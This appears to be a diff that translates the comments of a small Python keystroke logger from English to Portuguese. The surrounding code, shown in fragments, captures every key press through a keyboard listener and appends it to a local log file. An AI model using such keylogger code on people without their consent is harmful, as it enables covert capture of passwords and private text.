@@ -19,15 +19,15 @@ IGNORED_KEYS = {
     keyboard.Key.caps_lock
 }
 
-# Ensure log directory exists
+# Certifica existência do arquivo de logs
 os.makedirs(LOG_DIR, exist_ok=True)
 
-# Written to the log
+# Loga informações
 def write_log(text):
     with open(LOG_FILE, "a", encoding="utf-8") as f:
         f.write(text)
 
-# Keycapture
+# Captura de teclas
 def on_press(key):
     try:
         write_log(key.char)
@@ -45,6 +45,6 @@ def on_press(key):
         else:
             write_log(f"[{key}]")
 
-# Starts keyboard monitoring
+# Inicia monitoramento de digitação
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
